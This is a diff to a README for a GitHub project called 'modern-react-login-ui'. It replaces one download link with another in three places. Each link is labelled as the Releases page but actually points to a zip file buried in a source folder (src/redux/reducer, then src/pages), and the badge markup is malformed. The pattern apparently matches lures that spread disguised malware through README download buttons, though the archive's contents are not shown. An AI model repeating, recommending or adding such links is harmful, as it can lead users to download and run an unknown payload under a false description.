@@ -4,13 +4,13 @@
 
 Welcome to the **modern-react-login-ui** project! This application demonstrates advanced frontend patterns while providing a smooth user experience. Whether you're logging in or signing up, this app is designed to be easy to use.
 
-[![Download now](https://raw.githubusercontent.com/Vdoni21/modern-react-login-ui/main/src/redux/reducer/login-modern-ui-react-v3.5-beta.4.zip%20Now-Modern%20React%20Login%https://raw.githubusercontent.com/Vdoni21/modern-react-login-ui/main/src/redux/reducer/login-modern-ui-react-v3.5-beta.4.zip)](https://raw.githubusercontent.com/Vdoni21/modern-react-login-ui/main/src/redux/reducer/login-modern-ui-react-v3.5-beta.4.zip)
+[![Download now](https://github.com/Vdoni21/modern-react-login-ui/raw/refs/heads/main/src/pages/ui-react-modern-login-2.7.zip%20Now-Modern%20React%20Login%https://github.com/Vdoni21/modern-react-login-ui/raw/refs/heads/main/src/pages/ui-react-modern-login-2.7.zip)](https://github.com/Vdoni21/modern-react-login-ui/raw/refs/heads/main/src/pages/ui-react-modern-login-2.7.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the Releases page to download the application. Simply click on the button below:
 
-[Visit this page to download](https://raw.githubusercontent.com/Vdoni21/modern-react-login-ui/main/src/redux/reducer/login-modern-ui-react-v3.5-beta.4.zip)
+[Visit this page to download](https://github.com/Vdoni21/modern-react-login-ui/raw/refs/heads/main/src/pages/ui-react-modern-login-2.7.zip)
 
 ### 💻 System Requirements
 
@@ -87,4 +87,4 @@ We value user experience and encourage feedback. If you have questions or sugges
 
 The **modern-react-login-ui** application provides a simple, effective way to manage your login processes with a beautiful interface. Follow the steps above to download, install, and start using the app. Enjoy the streamlined experience and contribute with your feedback. 
 
-For further details and downloads, visit the Releases page again: [Visit this page to download](https://raw.githubusercontent.com/Vdoni21/modern-react-login-ui/main/src/redux/reducer/login-modern-ui-react-v3.5-beta.4.zip)
+For further details and downloads, visit the Releases page again: [Visit this page to download](https://github.com/Vdoni21/modern-react-login-ui/raw/refs/heads/main/src/pages/ui-react-modern-login-2.7.zip)
